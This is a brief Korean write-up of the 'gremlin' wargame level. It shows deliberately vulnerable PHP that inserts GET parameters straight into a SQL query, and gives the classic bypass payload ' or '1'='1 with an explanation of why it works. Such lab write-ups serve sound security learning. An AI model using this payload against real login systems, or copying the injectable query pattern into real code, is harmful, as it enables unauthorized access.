# gremlin

## 1. Code
```php
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); // do not try to attack another table, database!
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['id']) solve("gremlin");
  highlight_file(__FILE__);
?>
```

## 2. Condition
- GET 방식으로 id와 pw를 받는다.
- 작은 따옴표(0x27)를 필터링 하지 않고 있다.

## 3. Solution
변수명 | 값
---|---:
`id` | 1234
`pw` | 1234' or '1'='1


가장 기본적인 sql-injection예제이다.


해당 값을 보내면, query 속 조건은 다음과 같다.


**select id from prob_gremlin where id='1234' and pw='1234' or '1'='1'**


조건문은 `id='1234' and pw='1234'`와 `'1'='1'`부분으로 나누어 생각하면 쉽다.<br>
두 조건문 중 하나만 참이어도 참이 되므로, id를 가져오게 된다.